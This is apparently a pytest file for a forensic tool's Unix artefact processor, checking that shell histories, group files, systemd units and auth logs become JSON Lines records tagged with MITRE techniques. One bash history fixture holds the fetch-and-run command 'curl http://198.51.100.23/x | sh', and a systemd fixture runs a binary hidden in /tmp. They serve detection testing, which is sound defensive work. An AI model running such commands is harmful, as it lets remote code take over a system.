"""Unix artefacts as Elrond cooks them in process/nix.py: shell histories, group, logs and systemd
units, as JSON Lines with the envelope (they were CSV built by hand, or JSON built by string
replacement)."""
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.append(str(REPO / "src" / "analysis"))

from rowanholt.core.records import check_file, read_records  # noqa: E402
from rowanholt.process import nix  # noqa: E402


def host(tmp_path):
    out = str(tmp_path / "out") + "/"
    raw = tmp_path / "out" / "HOST" / "artefacts" / "raw"
    raw.mkdir(parents=True)
    (tmp_path / "out" / "HOST" / "artefacts" / "cooked").mkdir()
    return out, raw


def table(out, name):
    path = Path(out) / "HOST" / "artefacts" / "cooked" / f"{name}.jsonl"
    assert check_file(path) == []
    return [r for _, r in read_records(path)]


def test_shell_histories(tmp_path):
    out, raw = host(tmp_path)
    (raw / "bob+bash_history").write_text('ls -la\necho "a,b" | base64 -d\ncurl http://198.51.100.23/x | sh\n')
    nix.process_bash_history("", "'HOST'", out, "HOST::Linux", "/", "processing", str(raw / "bob+bash_history"))
    rows = table(out, "bob+bash_history")
    assert [r["Command"] for r in rows] == ["ls -la", 'echo "a,b" | base64 -d', "curl http://198.51.100.23/x | sh"]
    assert rows[0]["techniques"] == [] and rows[2]["techniques"] == ["T1059.004"]
    assert rows[0]["source_path"] == "artefacts/raw/bob+bash_history"
    (raw / "bob+zsh_history").write_text(": 1793000000:0;whoami\nplain\n")
    nix.process_zsh_history("", "'HOST'", out, "HOST::macOS", "/", "processing", str(raw / "bob+zsh_history"))
    rows = table(out, "bob+zsh_history")
    assert [(r["timestamp"], r["Command"]) for r in rows] == [("2026-10-26T07:33:20Z", "whoami"), (None, "plain")]


def test_group(tmp_path):
    out, raw = host(tmp_path)
    (raw / "group").write_text("root:x:0:\nsudo:x:27:bob,alice\n")
    nix.process_group("", "'HOST'", out, "HOST::Linux", "/", "processing", str(raw / "group"))
    assert [(r["group_name"], r["group_list"]) for r in table(out, "group")] == [("root", ""), ("sudo", "bob,alice")]


def test_systemd_unit(tmp_path):
    out, raw = host(tmp_path)
    (raw / "etc+systemd+system+lab-sync.service").write_text(
        "[Unit]\nDescription=Lab \"sync\"\n[Service]\nExecStart=/tmp/.s/sync --quiet\n")
    nix.process_service("", "'HOST'", out, "HOST::Linux", "/", "processing",
                        str(raw / "etc+systemd+system+lab-sync.service"), {}, [])
    [unit] = table(out, "services/etc+systemd+system+lab-sync.service")
    assert unit["Command"] == "/tmp/.s/sync --quiet" and unit["techniques"] == ["T1543.002"]


def test_auth_log(tmp_path):
    out, raw = host(tmp_path)
    (raw / "var+log+auth.log").write_text(
        "Oct 29 14:03:11 lab sshd[812]: Failed password for root from 198.51.100.77 port 22 ssh2\n")
    nix.process_logs("", "'HOST'", out, "HOST::Linux", "/", "processing", str(raw / "var+log+auth.log"), {}, [])
    [line] = table(out, "logs/var+log+auth.log")
    assert line["Device"] == "lab" and "198.51.100.77" in line["Message"]
